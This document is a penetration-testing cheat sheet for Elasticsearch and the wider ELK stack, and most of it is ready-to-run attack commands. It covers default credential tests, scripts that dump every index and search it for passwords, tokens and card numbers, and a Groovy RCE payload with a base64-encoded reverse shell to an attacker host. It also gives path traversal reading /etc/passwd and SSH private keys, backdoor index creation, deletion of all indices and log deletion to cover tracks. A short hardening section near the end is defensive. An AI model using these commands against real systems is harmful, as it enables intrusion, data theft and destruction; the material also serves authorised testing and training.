# ELASTICSEARCH ENUMERATION (Port 9200/9300)

## PORT OVERVIEW
```
Port 9200 - Elasticsearch HTTP API
Port 9300 - Elasticsearch Transport (node communication)
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p9200,9300 <IP>                       # Service/Version detection
curl http://<IP>:9200/                          # HTTP API root
curl http://<IP>:9200/_cluster/health           # Cluster health
nc -nv <IP> 9200                                # Manual connection
```

## ELASTICSEARCH REST API
```bash
# Elasticsearch uses RESTful HTTP API

# Root endpoint (version info)
curl http://<IP>:9200/
curl http://<IP>:9200/ | jq                     # Pretty print with jq

# Returns:
# - name (node name)
# - cluster_name
# - version (Elasticsearch version)
# - tagline: "You Know, for Search"
```

## NMAP ELASTICSEARCH ENUMERATION
```bash
nmap --script "elasticsearch-*" -p9200 <IP>     # All Elasticsearch scripts (if available)
nmap --script http-enum -p9200 <IP>             # Enumerate HTTP paths
nmap --script http-title -p9200 <IP>            # Get page title
```

## AUTHENTICATION TESTING
```bash
# Test for no authentication
curl http://<IP>:9200/_cluster/health           # If accessible, no auth required

# Test with credentials (if X-Pack security enabled)
curl -u <USER>:<PASSWORD> http://<IP>:9200/
curl -u elastic:changeme http://<IP>:9200/      # Default credentials

# Common default credentials
elastic:changeme                                # Elastic Stack default
elastic:elastic
admin:admin
```

## ENUMERATE CLUSTER INFORMATION
```bash
# Cluster health
curl http://<IP>:9200/_cluster/health           # Cluster status
curl http://<IP>:9200/_cluster/health?pretty    # Pretty print

# Cluster stats
curl http://<IP>:9200/_cluster/stats?pretty

# Cluster settings
curl http://<IP>:9200/_cluster/settings?pretty

# Node info
curl http://<IP>:9200/_nodes?pretty             # All nodes
curl http://<IP>:9200/_nodes/stats?pretty       # Node statistics
curl http://<IP>:9200/_cat/nodes?v              # List nodes (table format)

# Plugin info
curl http://<IP>:9200/_cat/plugins?v            # Installed plugins
```

## ENUMERATE INDICES (DATABASES)
```bash
# List all indices
curl http://<IP>:9200/_cat/indices?v            # Table format
curl http://<IP>:9200/_aliases?pretty           # List indices and aliases
curl http://<IP>:9200/_all                      # All indices (detailed)

# Get index information
curl http://<IP>:9200/<index>?pretty
curl http://<IP>:9200/<index>/_mapping?pretty   # Index mapping (schema)
curl http://<IP>:9200/<index>/_settings?pretty  # Index settings

# Count documents in index
curl http://<IP>:9200/<index>/_count?pretty
curl http://<IP>:9200/_cat/count/<index>?v      # Table format
```

## SEARCH & EXTRACT DATA
```bash
# Search all documents in index
curl http://<IP>:9200/<index>/_search?pretty
curl http://<IP>:9200/<index>/_search?size=100&pretty  # First 100 documents
curl http://<IP>:9200/<index>/_search?size=10000       # Large result set

# Search all indices
curl http://<IP>:9200/_all/_search?pretty
curl http://<IP>:9200/_search?pretty            # Alternative

# Query specific fields
curl http://<IP>:9200/<index>/_search?q=username:admin&pretty
curl http://<IP>:9200/<index>/_search?q=password:*&pretty

# Search with JSON query
curl -X POST http://<IP>:9200/<index>/_search?pretty -H 'Content-Type: application/json' -d '{
  "query": {
    "match_all": {}
  }
}'

# Search for sensitive data
curl http://<IP>:9200/_search?q=password&pretty
curl http://<IP>:9200/_search?q=token&pretty
curl http://<IP>:9200/_search?q=api_key&pretty
curl http://<IP>:9200/_search?q=credit_card&pretty
```

## EXTRACT ALL DATA
```bash
# Dump all indices
for index in $(curl -s http://<IP>:9200/_cat/indices | awk '{print $3}'); do
  echo "Dumping index: $index"
  curl -s http://<IP>:9200/$index/_search?size=10000 > ${index}.json
done

# Export using elasticdump
npm install -g elasticdump
elasticdump --input=http://<IP>:9200/<index> --output=<index>.json --type=data

# Dump all indices with elasticdump
for index in $(curl -s http://<IP>:9200/_cat/indices | awk '{print $3}'); do
  elasticdump --input=http://<IP>:9200/$index --output=${index}.json --type=data
done
```

## COMMAND EXECUTION (GROOVY SCRIPTS)
```bash
# Elasticsearch 1.4.2 and earlier allow dynamic scripting
# Can execute arbitrary code via Groovy scripts

# CVE-2014-3120 - Remote Code Execution
# Execute OS command via dynamic Groovy script
curl -X POST http://<IP>:9200/_search?pretty -H 'Content-Type: application/json' -d '{
  "size": 1,
  "query": {
    "filtered": {
      "query": {
        "match_all": {}
      }
    }
  },
  "script_fields": {
    "command": {
      "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"whoami\").getInputStream()).useDelimiter(\"\\\\A\").next();"
    }
  }
}'

# Reverse shell via Groovy
curl -X POST http://<IP>:9200/_search?pretty -H 'Content-Type: application/json' -d '{
  "size": 1,
  "script_fields": {
    "shell": {
      "script": "import java.io.*;Runtime.getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC88YXR0YWNrZXJfSVA+LzQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}\").waitFor()"
    }
  }
}'
```

## COMMAND EXECUTION (PAINLESS SCRIPTS)
```bash
# Elasticsearch 5.0+ uses Painless scripting language
# More restricted than Groovy, but may still allow code execution

# Test Painless script execution
curl -X POST http://<IP>:9200/_search?pretty -H 'Content-Type: application/json' -d '{
  "query": {
    "match_all": {}
  },
  "script_fields": {
    "test": {
      "script": {
        "lang": "painless",
        "source": "1 + 1"
      }
    }
  }
}'

# Painless sandbox is more restrictive
# Direct OS command execution usually not possible
# But may be able to access sensitive data or cause DoS
```

## DIRECTORY TRAVERSAL (CVE-2015-5531)
```bash
# Elasticsearch 1.5.1 and earlier - Directory Traversal
# Read arbitrary files via path traversal

# Read /etc/passwd
curl http://<IP>:9200/_plugin/../../../../../../../../etc/passwd

# Read sensitive files
curl http://<IP>:9200/_plugin/../../../../../../../../root/.ssh/id_rsa
curl http://<IP>:9200/_plugin/../../../../../../../../var/www/html/config.php
```

## CREATE/MODIFY/DELETE INDICES
```bash
# If no authentication, can modify data

# Create new index
curl -X PUT http://<IP>:9200/backdoor

# Add document to index
curl -X POST http://<IP>:9200/backdoor/_doc?pretty -H 'Content-Type: application/json' -d '{
  "message": "Backdoor access"
}'

# Update document
curl -X POST http://<IP>:9200/<index>/_doc/<id>/_update?pretty -H 'Content-Type: application/json' -d '{
  "doc": {
    "password": "hacked123"
  }
}'

# Delete index (destructive!)
curl -X DELETE http://<IP>:9200/<index>

# Delete all indices (VERY destructive!)
curl -X DELETE http://<IP>:9200/_all
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/elasticsearch/indices_enum  # Enumerate indices
use exploit/multi/elasticsearch/script_mvel_rce  # CVE-2014-3120 (Groovy RCE)
use exploit/multi/elasticsearch/search_groovy_script  # Groovy script execution

# Example: RCE via Groovy
set RHOSTS <IP>
set RPORT 9200
set LHOST <attacker_IP>
run
```

## KIBANA (PORT 5601)
```bash
# Kibana is the web UI for Elasticsearch
# Often runs on port 5601

# Access Kibana
http://<IP>:5601/                               # Kibana web interface
http://<IP>:5601/api/status                     # Kibana status

# Kibana vulnerabilities
# CVE-2018-17246 - Local File Inclusion
# CVE-2019-7609 - Prototype Pollution RCE

# Kibana LFI (CVE-2018-17246)
curl http://<IP>:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../etc/passwd

# Test with curl
curl http://<IP>:5601/api/status | jq
```

## LOGSTASH (PORT 9600)
```bash
# Logstash is data processing pipeline for Elasticsearch
# Often runs on port 9600 (API), 5000-5044 (inputs)

# Logstash API
curl http://<IP>:9600/                          # Root API
curl http://<IP>:9600/_node/stats?pretty        # Node stats
curl http://<IP>:9600/_node/hot_threads?pretty  # Hot threads

# Logstash file input exploitation
# If Logstash reads files, may be able to inject data
```

## ELASTICSEARCH ENUMERATION SCRIPT
```bash
# Automated Elasticsearch enumeration
cat > elastic_enum.sh <<'EOF'
#!/bin/bash
IP=$1
echo "[*] Elasticsearch Enumeration: $IP"
echo "[*] Version Info:"
curl -s http://$IP:9200/ | jq
echo "[*] Cluster Health:"
curl -s http://$IP:9200/_cluster/health?pretty
echo "[*] Indices:"
curl -s http://$IP:9200/_cat/indices?v
echo "[*] Nodes:"
curl -s http://$IP:9200/_cat/nodes?v
echo "[*] Plugins:"
curl -s http://$IP:9200/_cat/plugins?v
echo "[*] Searching for sensitive data..."
curl -s http://$IP:9200/_search?q=password | jq
EOF
chmod +x elastic_enum.sh
./elastic_enum.sh <IP>
```

## COMMON MISCONFIGURATIONS
```
☐ No authentication (X-Pack security disabled)
☐ Elasticsearch exposed to internet
☐ Dynamic scripting enabled (Groovy/MVEL)
☐ Default credentials (elastic:changeme)
☐ Old Elasticsearch version (known CVEs)
☐ No firewall rules
☐ Directory listing enabled
☐ Sensitive data stored in plaintext
☐ Overly permissive CORS settings
☐ No TLS/SSL encryption
```

## QUICK WIN CHECKLIST
```
☐ Test for no authentication
☐ Test default credentials (elastic:changeme)
☐ Enumerate cluster information (version, nodes)
☐ List all indices
☐ Search for sensitive data (passwords, tokens, API keys)
☐ Dump all indices
☐ Check Elasticsearch version for known CVEs
☐ Test for Groovy script execution (CVE-2014-3120)
☐ Test for directory traversal (CVE-2015-5531)
☐ Check for Kibana on port 5601
```

## ONE-LINER FULL ENUMERATION
```bash
# Quick Elasticsearch enumeration
curl -s http://<IP>:9200/ | jq
curl -s http://<IP>:9200/_cat/indices?v
curl -s http://<IP>:9200/_search?size=100&pretty

# Automated
./elastic_enum.sh <IP>

# Dump all data
for index in $(curl -s http://<IP>:9200/_cat/indices | awk '{print $3}'); do
  curl -s http://<IP>:9200/$index/_search?size=10000 > ${index}.json
done
```

## ADVANCED TECHNIQUES
```bash
# Elasticsearch SQL (X-Pack)
# If SQL feature is enabled
curl -X POST http://<IP>:9200/_sql?format=txt -H 'Content-Type: application/json' -d '{
  "query": "SHOW TABLES"
}'

# Elasticsearch aggregations
# Complex queries for data analysis
curl -X POST http://<IP>:9200/<index>/_search?pretty -H 'Content-Type: application/json' -d '{
  "aggs": {
    "unique_users": {
      "terms": {
        "field": "username.keyword"
      }
    }
  }
}'

# Elasticsearch snapshots
# Check for backup snapshots
curl http://<IP>:9200/_snapshot?pretty
curl http://<IP>:9200/_snapshot/<repo>/_all?pretty
```

## ELASTICSEARCH CVE EXPLOITS
```bash
# CVE-2014-3120 - Remote Code Execution (Groovy script)
# CVE-2015-1427 - Remote Code Execution (Groovy script)
# CVE-2015-3337 - Directory Traversal
# CVE-2015-5531 - Directory Traversal
# CVE-2018-17246 - Kibana Local File Inclusion
# CVE-2019-7609 - Kibana Prototype Pollution RCE

# Search for exploits
searchsploit elasticsearch
searchsploit kibana
```

## ELASTICSEARCH INJECTION
```bash
# If web app passes user input to Elasticsearch queries
# May be vulnerable to Elasticsearch injection

# Example vulnerable query
curl -X POST http://<IP>:9200/<index>/_search -d "{\"query\":{\"match\":{\"username\":\"$USER_INPUT\"}}}"

# Injection payload
# Close existing query and inject new query
admin\"}},\"script_fields\":{\"test\":{\"script\":\"1+1\"}}//

# Results in
{"query":{"match":{"username":"admin"}},"script_fields":{"test":{"script":"1+1"}}//"}}}
```

## RANSOMWARE TARGETING ELASTICSEARCH
```bash
# Elasticsearch instances have been targeted by ransomware
# Attackers delete indices and demand ransom

# Check for ransom notes
curl http://<IP>:9200/_cat/indices?v
# Look for suspicious index names: PLEASE_READ, WARNING, README

# Restore from snapshot if available
curl -X POST http://<IP>:9200/_snapshot/<repo>/<snapshot>/_restore
```

## POST-EXPLOITATION (AFTER ELASTICSEARCH ACCESS)
```bash
# After gaining Elasticsearch access:
1. Enumerate cluster information (version, nodes, plugins)
2. List all indices
3. Search for sensitive data (credentials, PII, tokens, API keys)
4. Dump all indices (elasticdump or curl)
5. Check Elasticsearch version for known CVEs
6. Test for code execution (Groovy/Painless scripts)
7. Check for Kibana (port 5601)
8. Check for Logstash (port 9600)
9. Create persistence (backdoor index with monitoring)
10. Cover tracks (delete access logs from Elasticsearch logs index)

# Full data extraction
# List all indices
curl -s http://<IP>:9200/_cat/indices?v | awk '{print $3}' | tail -n +2 > indices.txt

# Dump each index
while read index; do
  echo "Dumping index: $index"
  curl -s http://<IP>:9200/$index/_search?size=10000 | jq > ${index}.json
done < indices.txt

# Search for passwords across all indices
curl -s http://<IP>:9200/_all/_search?q=password | jq > passwords.json
curl -s http://<IP>:9200/_all/_search?q=token | jq > tokens.json
curl -s http://<IP>:9200/_all/_search?q=api_key | jq > api_keys.json
```

## ELASTICSEARCH SECURITY HARDENING (FOR BLUE TEAM)
```bash
# Secure Elasticsearch configuration

# Enable X-Pack security (authentication)
xpack.security.enabled: true

# Create users
bin/elasticsearch-users useradd <username> -p <password> -r superuser

# Bind to localhost only
network.host: 127.0.0.1

# Disable dynamic scripting (if not needed)
script.allowed_types: none

# Enable TLS/SSL
xpack.security.http.ssl.enabled: true
xpack.security.transport.ssl.enabled: true

# Firewall rules
# Allow only trusted IPs

# Update to latest version
# Older versions have known vulnerabilities

# Disable anonymous access
xpack.security.authc.anonymous.username: ""
xpack.security.authc.anonymous.roles: []
xpack.security.authc.anonymous.authz_exception: true

# Audit logging
xpack.security.audit.enabled: true
```

## ELASTICSEARCH MONITORING
```bash
# Monitor Elasticsearch for security events

# Check cluster health
curl http://<IP>:9200/_cluster/health?pretty

# Monitor nodes
curl http://<IP>:9200/_cat/nodes?v

# Check for suspicious queries
# Review Elasticsearch logs: /var/log/elasticsearch/

# Monitor for data exfiltration
# Large search queries, repeated queries, etc.

# Enable audit logging (X-Pack)
# Logs all access events
```

## ELASTIC STACK (ELK)
```bash
# Elastic Stack consists of:
# - Elasticsearch (search engine) - port 9200
# - Logstash (data pipeline) - port 5000-5044, 9600
# - Kibana (web UI) - port 5601
# - Beats (data shippers) - various ports

# Enumerate entire ELK stack
nmap -sV -p5000-5044,5601,9200,9300,9600 <IP>

# Check Elasticsearch
curl http://<IP>:9200/

# Check Kibana
curl http://<IP>:5601/api/status

# Check Logstash
curl http://<IP>:9600/
```
